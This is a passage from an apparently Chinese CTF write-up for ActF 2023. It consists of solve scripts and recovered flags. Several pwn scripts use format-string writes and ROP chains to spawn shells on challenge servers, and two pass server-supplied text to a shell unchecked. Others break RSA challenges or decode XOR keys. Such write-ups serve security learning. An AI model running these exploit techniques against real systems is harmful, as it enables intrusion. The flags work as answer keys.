    0x404050,
    elf.plt.setbuf
    ]
    }
)

sla('input:',pd)
ia()
#actf{b4by's_f1rst_pwn!_3857ffd6bfdf775e}
```



```
#!/usr/bin/env python3
import subprocess
from pwncli import *
cli_script()

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

filename  = gift.filename # current filename
is_debug  = gift.debug # is debug or not 
is_remote = gift.remote # is remote or not
gdb_pid   = gift.gdb_pid # gdb pid if debug

if gift.remote:
    libc = ELF("./libc.so.6")
    gift[libc] = libc

def execute_curl_command():
    ru('proof of work: ')
    fxxk = rl()[:-1]
    command = (fxxk)
    output = subprocess.check_output(command, shell=True)
    return output.decode("utf-8").strip()
sla('solution:',execute_curl_command())

sla('Amount: ','48')

sa('Contents: ',flat(
    {
    0:'%10$s',
    16:elf.got.printf,
    40-8:[
    0x404000+0xd00,
    0x401449
    ]
    }
))
ru('Your input: ')
leak_libc = recv_current_libc_addr()
log_address_ex2(leak_libc)
lb = leak_libc - libc.sym.printf
libc.address = lb
log_address_ex2(lb)
sleep(2)

CurrentGadgets.set_find_area(0,1)
s(flat(
    {
    40:[
    CurrentGadgets.execve_chain()
    
    ]
    }
))

ia()
```



```
#!/usr/bin/env python3
import subprocess
from pwncli import *
cli_script()

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

filename  = gift.filename # current filename
is_debug  = gift.debug # is debug or not 
is_remote = gift.remote # is remote or not
gdb_pid   = gift.gdb_pid # gdb pid if debug

if gift.remote:
    libc = ELF("./libc.so.6")
    gift[libc] = libc

def execute_curl_command():
    ru('proof of work: ')
    fxxk = rl()[:-1]
    command = (fxxk)
    output = subprocess.check_output(command, shell=True)
    return output.decode("utf-8").strip()
sla('solution:',execute_curl_command())

sla('Amount: ','48')

sa('Contents: ',flat(
    {
    40-8:[
    0x404020+0x90,
    0x40130B,

    ]
    }
))

ia()
```



```
#!/usr/bin/env python3

from pwncli import *
cli_script()

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

filename  = gift.filename # current filename
is_debug  = gift.debug # is debug or not 
is_remote = gift.remote # is remote or not
gdb_pid   = gift.gdb_pid # gdb pid if debug

def attack(retstack,val):
    #%57$
    for i in range(6):
        attack_val = val&0xff
        val = val >> 8
        pd = flat(
        {
            0:['%55$hhn']
        },filler = 'x00'
        )
        sleep(0.02)

        sla('Professional): ',pd)
        pd = flat(
        {
            0:'%' + str(retstack+i&0xff) + 'c' + '%42$hhn'
        },filler = 'x00'
        )
        sla('Professional):',pd)
        pd = flat(
        {
            0:['%55$hhnx0a']
        },filler = 'x00'
        )
        sa('Professional):',pd)
        log_address_ex2(attack_val)
        pd = flat(
        {
            0:'%' + str(attack_val) + 'c' + '%57$hhnx0a'
        },filler = 'x00'
        )
        sa('Professional):',pd)
        

pd = flat(
    {
    0:'%28$p-%21$p'
    },filler = 'x00'
    )
sleep(0.05)
sla('Professional):',pd)
ru('You: ')
leak_stack = int(ru('-')[:-1],16)
attack_stack = leak_stack - 0x180

leak_libc= int(rl()[:-1],16)
log_address_ex2(leak_libc)
lb = leak_libc - 0x29d90
libc.address = lb
log_address_ex2(lb)
sleep(0.05)
pd = flat(
    {
    0:'%' + str(attack_stack&0xffff) + 'c' + '%28$hn'
    },filler = 'x00',length = 13
    )
sa('Professional):',pd)
sleep(1)
#%55$p
pd = flat(
        {
        0:['%55$hhn']
        },filler = 'x00'
    )
sla('Professional):',pd)
sleep(0.05)
retstack = leak_stack - 0x110
pd = flat(
    {
    0:'%' + str(retstack&0xffff) + 'c' + '%42$hn'
    },filler = 'x00'
    )
sa('Professional):',pd)
sleep(0.05)
pd = flat(
        {
        0:['%55$hhn']
        },filler = 'x00'
    )
sla('Professional):',pd)
CurrentGadgets.set_find_area(0,1)

pd = CurrentGadgets.pop_rdi_ret()
attack(retstack,pd)

pd = libc.search(b'/bin/shx00').__next__()
attack(retstack+8,pd)

pd = CurrentGadgets.ret()
attack(retstack+0x10,pd)
pd = libc.sym.system
attack(retstack+0x18,pd)

sl('0')

ia()
```



```
from socket import timeout
from pwn import *

HOST = 'challs.actf.co'
PORT = 31402

def combine_strings(str1, str2):
 return str1[:3] + str2[-3:]

# 连接到服务器
conn = remote(HOST, PORT)

# 处理数据并发送结果
try:
 while True:
 data = conn.recvline().decode().strip()
 if not data:
 break
 print(data)

 match = re.search(r'of (.*) with the last 3 letters of (.*)', data)
 if match:
 re_str1 = match.group(1)
 re_str2 = match.group(2)
 print(re_str1)
 print(re_str2)
 # 结合两个字符串
 new_string = combine_strings(re_str1, re_str2)
 print(new_string)
 #timeout(1)
 # 发送新字符串到服务器
 conn.sendline(new_string.encode())

 
except Exception as e:
 print(f"Exception: {e}")
 print("Last message from server:")
 #data2 = conn.recvline().decode().strip()
 print(conn.recvall())

# 关闭连接
conn.close()
```



```
from pwn import *
p = remote('challs.actf.co',32760)

p.sendlineafter('sheep: ','4919')
p.sendlineafter("you can't: ",'1')
a = 'anextremelycomplicatedkeythatisdefinitelyuselessss'
b = "2& =$!-( <*+*( ?!&$$6,. )' $19 , #9=!1 <*=6 <6;66#"

c = ''
for i in range(len(a)):
    c += chr(ord(a[i])^ord(b[i]))
p.sendlineafter('word?n',c)

p.interactive()
```



```
actf{lo0ks_like_we'll_h4ve_to_try_an0ther_dress1ng_5ef89b3a44901831}
```



```
#!/usr/local/bin/python

def fake_psi(a, b):
    return [i for i in a if i in b]

def zero_encoding(x, n):
    ret = []

    for i in range(n):
        if (x & 1) == 0:
            ret.append(x | 1)

        x >>= 1

    return ret

def one_encoding(x, n):
    ret = []

    for i in range(n):
        if x & 1:
            ret.append(x)

        x >>= 1

    return ret

print("Supply positive x and y such that x < y and x > y.")
x = int(input("x: "))
y = int(input("y: "))

if len(fake_psi(one_encoding(x, 64), zero_encoding(y, 64))) == 0 and x > y and x > 0 and y > 0:
    print(open("flag.txt").read())
```



```
from Crypto.Util.number import getStrongPrime, bytes_to_long
f = open("flag.txt").read()
m = bytes_to_long(f.encode())
p = getStrongPrime(512)
q = getStrongPrime(512)
n = p*q
e = 65537
c = pow(m,e,n)
print("n =",n)
print("e =",e)
print("c =",c)
print("(p-2)*(q-1) =", (p-2)*(q-1))
print("(p-1)*(q-2) =", (p-1)*(q-2))
```



```
n = 125152237161980107859596658891851084232065907177682165993300073587653109353529564397637482758441209445085460664497151026134819384539887509146955251284230158509195522123739130077725744091649212709410268449632822394998403777113982287135909401792915941770405800840172214125677106752311001755849804716850482011237
e = 65537
c = 40544832072726879770661606103417010618988078158535064967318135325645800905492733782556836821807067038917156891878646364780739241157067824416245546374568847937204678288252116089080688173934638564031950544806463980467254757125934359394683198190255474629179266277601987023393543376811412693043039558487983367289
h1 = 125152237161980107859596658891851084232065907177682165993300073587653109353529564397637482758441209445085460664497151026134819384539887509146955251284230125943565148141498300205893475242956903188936949934637477735897301870046234768439825644866543391610507164360506843171701976641285249754264159339017466738250
h2 = 125152237161980107859596658891851084232065907177682165993300073587653109353529564397637482758441209445085460664497151026134819384539887509146955251284230123577760657520479879758538312798938234126141096433998438004751495264208294710150161381066757910797946636886901614307738041629014360829994204066455759806614
a=n-h1+2
b=2*(n-h2)+4
import gmpy2
p=gmpy2.gcd(b-a,n)
q=n//p
d=gmpy2.invert(e,(p-1)*(q-1))
m=pow(c,d,n)
from Crypto.Util.number import *
print(long_to_bytes(m))
#actf{tw0_equ4ti0ns_in_tw0_unkn0wns_d62507431b7e7087}
```



```
from Crypto.Util.number import getStrongPrime, bytes_to_long, long_to_bytes
f = open("flag.txt").read()
m = bytes_to_long(f.encode())
p = getStrongPrime(512)
q = getStrongPrime(512)
n = p*q
e = 65537
c = pow(m,e,n)
print("n =",n)
print("e =",e)
print("c =",c)

d = pow(e, -1, (p-1)*(q-1))

c = int(input("Text to decrypt: "))

if c == m or b"actf{" in long_to_bytes(pow(c, d, n)):
    print("No flag for you!")
    exit(1)

print("m =", pow(c, d, n))
```



```
from Crypto.Util.number import *
n = 125599176571600020653591006850671918629969316481963062048627899456165392819660860740063083701116993746821677119724732749154516815660187428871607902333403883531995982511670779222688750122385320108285448513711360492525583823239144738204403791494094189914263158329757646207097685944406086316650210435629015580441
e = 65537
c = 118356699644273181014656096442468434092741953493535637242089038822421604090520338228951532311310670264465550052347866421933804678431771754308403610411364147164144986161358033438786432298384562234382847670449017346123112400553187892435784965521706143303825780409089666411990538839432926212604876110990468222147
def get_M():
    X = 31
    Y = 2245210353507115744853619512763365103513604203252345078552352164656244721761498436382540411511342605064367502059224782489794482885805847835150166633217981938173524890815767043000942837015297824912761101682532115739430712588817915577317506214466354298172138616710257304537044994467111779824460332769762294569
    Z = 1815130072598125153013806999324629484146992932282840740577392431166379221925559013496695934091738262155265245310243
    i = 0
    while True:
        M = (n * i + Z) // X
        if b'actf{' in long_to_bytes(M):
            print(long_to_bytes(M))
            break
get_M()
#actf{rs4_is_sorta_homom0rphic_50c8d344df58322b}
```



```
from pwn import *
def jisuan(o,a0,M):
    p=''
    p+=str(a0)+' '
    for i in range(17):
        o=(o-a0)//M
        a0=o%M
        p+=str(a0)+' '
    return p
M = 127
r=remote('challs.actf.co',32100)
print(r.recv())
r.sendline(b'1')
print(r.recv())
r.sendline(b'0 127')
a0=int(r.recvline())
a1=int(r.recvline())
print(a0,a1)
p=jisuan(a1,a0,M)
print(p)
print(r.recv())
r.sendline(b'2')
print(r.recv())
r.sendline(p.encode())
print(r.recv())
a=[56 ,102 ,102 ,102 ,48 ,99 ,97 ,116 ,48 ,98 ,56 ,125 ,55 ,97 ,55 ,54 ,123 ,54 ]
b=[6 ,5 ,3 ,8 ,7, 1 ,13 ,2 ,10 ,16 ,11 ,17 ,14 ,0 ,15 ,12, 4 ,9]
c=[0]*18
flag=''
for i in range(len(a)):
    c[b[i]]=chr(a[i])
for k in c:
    flag+=k
print(flag)
#actf{f80f6086a77b}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/0-1682730403.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/8-1682730403.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/0-1682730403.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/2-1682730404.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/8-1682730404.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/8-1682730405.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/8-1682730405.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/9-1682730405.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/10-1682730405.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/0-1682730406.png)